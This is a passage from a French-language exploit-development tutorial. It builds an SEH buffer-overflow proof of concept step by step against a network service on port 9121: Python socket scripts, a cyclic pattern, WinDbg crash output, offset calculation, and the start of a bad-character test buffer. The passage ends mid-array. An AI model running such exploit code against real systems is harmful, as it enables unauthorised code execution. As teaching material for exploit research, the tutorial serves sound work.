<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="n">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B</span>
</code></pre></div>
<p>On modifie la preuve de concept en remplaçant les <code>A</code> par la chaine générée :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>
<a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">9121</span>
<a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">1000</span>
<a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>
<a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B&quot;</span>
<a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a>
<a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a>  <span class="n">header</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x75\x19\xba\xab</span><span class="s2">&quot;</span>
<a id="__codelineno-30-14" name="__codelineno-30-14" href="#__codelineno-30-14"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x03\x00\x00\x00</span><span class="s2">&quot;</span>
<a id="__codelineno-30-15" name="__codelineno-30-15" href="#__codelineno-30-15"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00\x40\x00\x00</span><span class="s2">&quot;</span>
<a id="__codelineno-30-16" name="__codelineno-30-16" href="#__codelineno-30-16"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-30-17" name="__codelineno-30-17" href="#__codelineno-30-17"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-30-18" name="__codelineno-30-18" href="#__codelineno-30-18"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">inputBuffer</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
<a id="__codelineno-30-19" name="__codelineno-30-19" href="#__codelineno-30-19"></a>
<a id="__codelineno-30-20" name="__codelineno-30-20" href="#__codelineno-30-20"></a>  <span class="n">buf</span> <span class="o">=</span> <span class="n">header</span> <span class="o">+</span> <span class="n">inputBuffer</span>
<a id="__codelineno-30-21" name="__codelineno-30-21" href="#__codelineno-30-21"></a>  <span class="p">[</span><span class="o">...</span><span class="p">]</span>
</code></pre></div>
<p>WinDbg suite à l'exécution de l'exploit :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="p">(</span><span class="n">910</span><span class="p">.</span><span class="n">18c8</span><span class="p">):</span> <span class="n">Access</span> <span class="n">violation</span> <span class="p">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="n">First</span> <span class="n">chance</span> <span class="n">exceptions</span> <span class="n">are</span> <span class="n">reported</span> <span class="n">before</span> <span class="n">any</span> <span class="n">exception</span> <span class="n">handling</span><span class="p">.</span>
<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="n">This</span> <span class="n">exception</span> <span class="n">may</span> <span class="n">be</span> <span class="n">expected</span> <span class="n">and</span> <span class="n">handled</span><span class="p">.</span>
<a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">33654132</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="n">eip</span><span class="p">=</span><span class="n">33654132</span> <span class="n">esp</span><span class="p">=</span><span class="n">01dff438</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01dff458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010246</span>
<a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="n">33654132</span> <span class="p">??</span>              <span class="p">???</span>
<a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a><span class="c">#</span>
<a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">exchain</span>
<a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a><span class="n">01dff44c</span><span class="p">:</span> <span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">+</span><span class="n">44</span> <span class="p">(</span><span class="n">77853b20</span><span class="p">)</span>
<a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a><span class="n">01dffe1c</span><span class="p">:</span> <span class="n">libpal</span><span class="p">!</span><span class="n">md5_starts</span><span class="p">+</span><span class="n">149fb</span> <span class="p">(</span><span class="n">0090df5b</span><span class="p">)</span>
<a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a><span class="n">01dfff54</span><span class="p">:</span> <span class="n">33654132</span>
<a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a><span class="n">Invalid</span> <span class="n">exception</span> <span class="n">stack</span> <span class="n">at</span> <span class="n">65413165</span>
</code></pre></div>
<p>L'<em>exception handler</em> a été correctement réécrit par notre motif unique.</p>
<p>Pour identifier l'<em>offset</em> exacte, on peut réutiliser le même outil :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="p">$</span> <span class="n">msf-pattern_offset</span> <span class="n">-l</span> <span class="n">1000</span> <span class="n">-q</span> <span class="n">33654132</span>
<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="p">[*]</span> <span class="n">Exact</span> <span class="n">match</span> <span class="n">at</span> <span class="n">offset</span> <span class="n">128</span>
</code></pre></div>
<p>On modifie la preuve de concept en adaptant le nombre de <code>A</code> et en réécrivant <code>EIP</code> spécifiquement avec des <code>B</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>
<a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">9121</span>
<a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">1000</span>
<a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a>
<a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">128</span>
<a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x42\x42\x42\x42</span><span class="s2">&quot;</span>
<a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x43</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-33-14" name="__codelineno-33-14" href="#__codelineno-33-14"></a>
<a id="__codelineno-33-15" name="__codelineno-33-15" href="#__codelineno-33-15"></a>  <span class="n">header</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x75\x19\xba\xab</span><span class="s2">&quot;</span>
<a id="__codelineno-33-16" name="__codelineno-33-16" href="#__codelineno-33-16"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x03\x00\x00\x00</span><span class="s2">&quot;</span>
<a id="__codelineno-33-17" name="__codelineno-33-17" href="#__codelineno-33-17"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00\x40\x00\x00</span><span class="s2">&quot;</span>
<a id="__codelineno-33-18" name="__codelineno-33-18" href="#__codelineno-33-18"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-33-19" name="__codelineno-33-19" href="#__codelineno-33-19"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-33-20" name="__codelineno-33-20" href="#__codelineno-33-20"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">inputBuffer</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
<a id="__codelineno-33-21" name="__codelineno-33-21" href="#__codelineno-33-21"></a>
<a id="__codelineno-33-22" name="__codelineno-33-22" href="#__codelineno-33-22"></a>  <span class="n">buf</span> <span class="o">=</span> <span class="n">header</span> <span class="o">+</span> <span class="n">inputBuffer</span>
<a id="__codelineno-33-23" name="__codelineno-33-23" href="#__codelineno-33-23"></a>  <span class="p">[</span><span class="o">...</span><span class="p">]</span>
</code></pre></div>
<p>WinDbg suite à l'exécution de l'exploit :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="p">(</span><span class="n">1810</span><span class="p">.</span><span class="n">34c</span><span class="p">):</span> <span class="n">Access</span> <span class="n">violation</span> <span class="p">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="n">First</span> <span class="n">chance</span> <span class="n">exceptions</span> <span class="n">are</span> <span class="n">reported</span> <span class="n">before</span> <span class="n">any</span> <span class="n">exception</span> <span class="n">handling</span><span class="p">.</span>
<a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="n">This</span> <span class="n">exception</span> <span class="n">may</span> <span class="n">be</span> <span class="n">expected</span> <span class="n">and</span> <span class="n">handled</span><span class="p">.</span>
<a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">42424242</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="n">eip</span><span class="p">=</span><span class="n">42424242</span> <span class="n">esp</span><span class="p">=</span><span class="n">01a0f438</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01a0f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010246</span>
<a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a><span class="n">42424242</span> <span class="p">??</span>              <span class="p">???</span>
<a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a><span class="c">#</span>
<a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">exchain</span>
<a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a><span class="n">01a0f44c</span><span class="p">:</span> <span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">+</span><span class="n">44</span> <span class="p">(</span><span class="n">77853b20</span><span class="p">)</span>
<a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a><span class="n">01a0fe1c</span><span class="p">:</span> <span class="n">libpal</span><span class="p">!</span><span class="n">md5_starts</span><span class="p">+</span><span class="n">149fb</span> <span class="p">(</span><span class="n">008ddf5b</span><span class="p">)</span>
<a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a><span class="n">01a0ff54</span><span class="p">:</span> <span class="n">42424242</span>
<a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a><span class="n">Invalid</span> <span class="n">exception</span> <span class="n">stack</span> <span class="n">at</span> <span class="n">41414141</span>
</code></pre></div>
<p>L'<em>exception handler</em> a été correctement réécrit par les <code>B</code>.</p>
<h3 id="identifier-les-mauvais-caracteres">Identifier les mauvais caractères</h3>
<p>En fonction de l'application, du type de vulnérabilité ou du protocole utilise certains caractères sont considéré comme <em>bad</em>. Les <em>bad char</em> ne doivent pas être utilisés dans le <em>buffer</em>, l'adresse de retour ou le <em>shellcode</em>.</p>
<p>Un caractère est considéré comme <em>bad</em> s'il entraine un changement dans la nature du crash ou une déformation en mémoire tel que <code>0x00</code> qui est le <em>null byte</em>.</p>
<p>Le caractère  <code>0x00</code> doit être systématiquement évité.</p>
<p>Il faut tester et identifier l'ensemble des <code>bad</code> caractères a chaque développement d'exploit en envoyant l'ensemble des caractères possible entre <code>0x00</code> et <code>0xFF</code> au sein du <em>buffer</em> pour observer la réaction de l'application.</p>
<p>On modifie la preuve de concept afin d'inclure l'ensemble des caractères possible sauf <code>0x00</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="ch">#!/usr/bin/python                                                                                                           </span>
<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>
<a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">9121</span>
<a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">1000</span>
<a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a>
<a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a>  <span class="n">badchars</span> <span class="o">=</span> <span class="p">(</span>
<a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d</span><span class="s2">&quot;</span>
<a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a</span><span class="s2">&quot;</span>
<a id="__codelineno-35-14" name="__codelineno-35-14" href="#__codelineno-35-14"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27</span><span class="s2">&quot;</span>
<a id="__codelineno-35-15" name="__codelineno-35-15" href="#__codelineno-35-15"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34</span><span class="s2">&quot;</span>
<a id="__codelineno-35-16" name="__codelineno-35-16" href="#__codelineno-35-16"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41</span><span class="s2">&quot;</span>
<a id="__codelineno-35-17" name="__codelineno-35-17" href="#__codelineno-35-17"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e</span><span class="s2">&quot;</span>
<a id="__codelineno-35-18" name="__codelineno-35-18" href="#__codelineno-35-18"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b</span><span class="s2">&quot;</span>
<a id="__codelineno-35-19" name="__codelineno-35-19" href="#__codelineno-35-19"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68</span><span class="s2">&quot;</span>
<a id="__codelineno-35-20" name="__codelineno-35-20" href="#__codelineno-35-20"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75</span><span class="s2">&quot;</span>
<a id="__codelineno-35-21" name="__codelineno-35-21" href="#__codelineno-35-21"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82</span><span class="s2">&quot;</span>
<a id="__codelineno-35-22" name="__codelineno-35-22" href="#__codelineno-35-22"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f</span><span class="s2">&quot;</span>
<a id="__codelineno-35-23" name="__codelineno-35-23" href="#__codelineno-35-23"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c</span><span class="s2">&quot;</span>
<a id="__codelineno-35-24" name="__codelineno-35-24" href="#__codelineno-35-24"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9</span><span class="s2">&quot;</span>
<a id="__codelineno-35-25" name="__codelineno-35-25" href="#__codelineno-35-25"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6</span><span class="s2">&quot;</span>
<a id="__codelineno-35-26" name="__codelineno-35-26" href="#__codelineno-35-26"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3</span><span class="s2">&quot;</span>
<a id="__codelineno-35-27" name="__codelineno-35-27" href="#__codelineno-35-27"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0</span><span class="s2">&quot;</span>
<a id="__codelineno-35-28" name="__codelineno-35-28" href="#__codelineno-35-28"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd</span><span class="s2">&quot;</span>
<a id="__codelineno-35-29" name="__codelineno-35-29" href="#__codelineno-35-29"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea</span><span class="s2">&quot;</span>
<a id="__codelineno-35-30" name="__codelineno-35-30" href="#__codelineno-35-30"></a>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7</span><span class="s2">&quot;</span>
